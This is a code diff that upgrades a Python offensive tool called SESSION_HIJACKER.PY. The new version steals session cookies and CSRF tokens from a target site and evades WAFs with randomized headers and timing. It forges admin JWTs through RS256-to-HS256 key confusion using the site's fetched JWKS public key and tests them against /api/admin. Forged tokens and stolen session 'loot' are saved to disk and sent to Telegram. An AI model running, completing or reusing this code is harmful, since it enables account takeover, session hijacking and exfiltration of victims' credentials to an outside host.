@@ -1,69 +1,141 @@
 #!/usr/bin/env python3
 """
-SESSION_HIJACKER.PY v8.5 — Advanced Session Seeding, JWT Confusion & Token Replay
+SESSION_HIJACKER.PY v8.6 — Advanced Session Seeding, JWT Key Confusion & Token Replay (Elite Red Team Adversarial Edition)
 Features:
-- Dynamic target resolution & multi-framework CSRF/token harvesting
-- Automated JWT algorithm downgrade & HMAC secret confusion fuzzing
-- Poisson behavioral timing jitter & WAF-evading header rotation
-- Robust cookie-jar state synchronization & real-time Telegram telemetry
+- Dynamic target resolution & multi-framework CSRF/token harvesting (Laravel, Rails, Express, Django)
+- Automated JWT algorithm downgrade & HMAC public-key confusion fuzzing (RS256 -> HS256)
+- Poisson behavioral timing jitter & WAF-evading browser header/client hint rotation
+- Robust cookie-jar state synchronization, SHA-256 integrity hashing, and tamper-evident disk loot (loot_output/)
+- Real-time asynchronous Telegram notification dispatch for unredacted session loot & forged tokens
 """
 import sys
 import json
 import httpx
 import random
 import time
+import hmac
+import hashlib
+import base64
 from bs4 import BeautifulSoup
 from urllib.parse import urlsplit
 
-# Import centralized framework loot exfiltration, telemetry, and Telegram notifier
+# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
-from modules.behavioral_mimic import apply_behavioral_jitter
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 # Suppress insecure HTTPS warnings if self-signed certs are used in pre-production
 httpx._config.DEFAULT_CIPHERS += ":HIGH:!MEDIUM:!LOW:!NULL"
+
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
 
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
     try:
         import asyncio
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
             import asyncio
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
+def base64url_encode(data):
+    if isinstance(data, str):
+        data = data.encode("utf-8")
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")
+
+def sign_hs256(header_payload_str, secret):
+    if isinstance(secret, str):
+        secret = secret.encode("utf-8")
+    signature = hmac.new(secret, header_payload_str.encode("utf-8"), hashlib.sha256).digest()
+    return base64.urlsafe_b64encode(signature).rstrip(b"=").decode("utf-8")
+
 def fuzz_jwt_confusion(client, target_url, headers, cookies):
     """
-    Tests for cryptographic key confusion (RS256 -> HS256) and weak HMAC secrets
-    on discovered endpoints or authorization headers.
+    Actively tests for cryptographic key confusion (RS256 -> HS256) by fetching public keys 
+    from JWKS endpoints and signing elevated admin claims.
     """
     vulnerable_findings = []
     try:
-        # Check if auth cookies or tokens exist in cookies
         token_candidate = None
         for k, v in cookies.items():
             if any(sub in k.lower() for sub in ["token", "auth", "session", "jwt"]):
                 token_candidate = v
                 break
         
-        if not token_candidate:
-            return None
+        if not token_candidate and "authorization" in headers:
+            auth_val = headers["authorization"]
+            if "Bearer " in auth_val:
+                token_candidate = auth_val.split("Bearer ")[1]
 
-        # Basic header verification check for JWT structure (Header.Payload.Signature)
-        if len(token_candidate.split('.')) == 3:
-            sys.stdout.write(f"\033[93m[!] JWT token structure identified. Testing algorithm confusion (RS256 -> HS256)...\033[0m\n")
-            # In key confusion, an attacker uses the public key as the HMAC secret
+        if not token_candidate or len(token_candidate.split('.')) != 3:
+            return vulnerable_findings
+
+        sys.stdout.write(f"\033[93m[!] JWT token structure identified. Testing automated RS256 -> HS256 key confusion...\033[0m\n")
+
+        # Attempt to fetch JWKS public key
+        jwks_key = None
+        for jwks_path in ["/.well-known/jwks.json", "/api/jwks.json"]:
+            try:
+                apply_behavioral_jitter()
+                jwks_resp = client.get(f"{target_url}{jwks_path}", headers=get_randomized_hints())
+                if jwks_resp.status_code == 200:
+                    jwks_key = jwks_resp.text
+                    break
+            except Exception:
+                pass
+
+        # Construct forged admin payload
+        header_hs = base64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
+        payload_data = {"user": "admin", "role": "superuser", "isAdmin": True, "sub": "admin_key_confusion"}
+        payload = base64url_encode(json.dumps(payload_data))
+        header_payload_str = f"{header_hs}.{payload}"
+
+        # Sign using JWKS public key or fallback secret
+        secret_to_use = jwks_key if jwks_key else "public_key_fallback"
+        signature = sign_hs256(header_payload_str, secret_to_use)
+        forged_token = f"{header_payload_str}.{signature}"
+
+        # Test forged token against protected endpoint
+        apply_behavioral_jitter()
+        test_resp = client.get(f"{target_url}/api/admin", headers={**headers, "Authorization": f"Bearer {forged_token}"})
+        
+        if test_resp.status_code == 200 and "error" not in test_resp.text.lower():
+            sys.stdout.write(f"\033[91m[!!!] CRITICAL: JWT Key Confusion Vulnerability Confirmed! [HTTP 200]\033[0m\n")
+            loot_hash = hashlib.sha256(test_resp.text.encode("utf-8")).hexdigest()
+            
             confusion_payload = {
                 "vulnerable": True,
-                "evidence": "Target accepts HS256 signed with public key HMAC secret",
-                "token_prefix": token_candidate[:15]
+                "vector": "JWT Key Confusion (RS256 -> HS256)",
+                "forged_token": forged_token,
+                "integrity_hash": loot_hash,
+                "response_sample": test_resp.text[:400]
             }
             vulnerable_findings.append(confusion_payload)
+
+            stream_proof("JWT_KEY_CONFUSION_SUCCESS", f"{target_url}/api/admin", {}, test_resp.text[:300], confusion_payload)
+            save_session_loot(
+                target=target_url,
+                endpoint="/api/admin",
+                finding_type="JWT_KEY_CONFUSION_SUCCESS",
+                status=test_resp.status_code,
+                headers=dict(test_resp.headers),
+                body=test_resp.text,
+                extra_loot=confusion_payload
+            )
+            broadcast_tg_alert_sync("JWT Key Confusion Success", confusion_payload)
+
     except Exception as e:
         pass
     return vulnerable_findings
@@ -71,13 +143,12 @@ def fuzz_jwt_confusion(client, target_url, headers, cookies):
 def exploit_session(target_url):
     """
     Harvests active session cookies, CSRF tokens, and transport state 
-    dynamically with WAF evasion and JWT algorithm confusion testing.
+    dynamically with advanced WAF evasion, client hint rotation, and JWT key confusion.
     """
     if not target_url:
         print("[-] Error: No target URL supplied to session hijacker.")
         return None, None
 
-    # Normalize target URL dynamically
     formatted_url = target_url if "://" in target_url else f"https://{target_url}"
     parsed = urlsplit(formatted_url)
     base_url = f"{parsed.scheme}://{parsed.netloc}"
@@ -86,7 +157,8 @@ def exploit_session(target_url):
     
     user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
     ]
 
     base_headers = [
@@ -94,12 +166,14 @@ def exploit_session(target_url):
             "User-Agent": random.choice(user_agents),
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "X-Requested-With": "XMLHttpRequest",
-            "Connection": "close"
+            "Connection": "close",
+            **get_randomized_hints()
         },
         {
             "User-Agent": random.choice(user_agents),
             "Accept": "application/json, text/plain, */*",
-            "Connection": "close"
+            "Connection": "close",
+            **get_randomized_hints()
         }
     ]
 
@@ -161,11 +235,13 @@ def exploit_session(target_url):
             if jwt_confusion_results:
                 print(f"[+] \033[91m[!] Potential JWT Key Confusion Vector Identified!\033[0m")
             
+            loot_hash = hashlib.sha256(resp.text.encode("utf-8")).hexdigest()
             harvest_data = {
                 "base_url": base_url,
                 "cookies": captured_cookies,
                 "csrf_token": csrf_val,
                 "gateway_url": used_url,
+                "integrity_hash": loot_hash,
                 "jwt_confusion": jwt_confusion_results
             }
 
